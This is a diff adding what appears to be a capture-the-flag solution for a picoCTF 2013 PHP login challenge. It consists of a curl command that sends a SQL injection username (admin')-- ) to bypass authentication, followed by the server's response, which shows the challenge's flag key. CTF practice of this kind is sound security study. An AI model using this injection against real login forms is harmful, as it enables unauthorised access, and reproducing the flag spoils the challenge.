@@ -1,0 +1,14 @@
+$ curl "https://2013.picoctf.com/problems/php3/index.php" -F "user=admin')-- " -F 'pass=test'
+<html>
+<head>
+Secure Web Login
+</head>
+<body>
+<p>Logged in! Key: 8ab9b92c174dd483ad17cee1bb0c5bdb </p><form method=post action=index.php>
+<input type=text name=user value="Username">
+<input type=password name=pass value="Password">
+<input type=submit>
+</form>
+</body>
+<a href="index.phps">Source</a>
+</html>
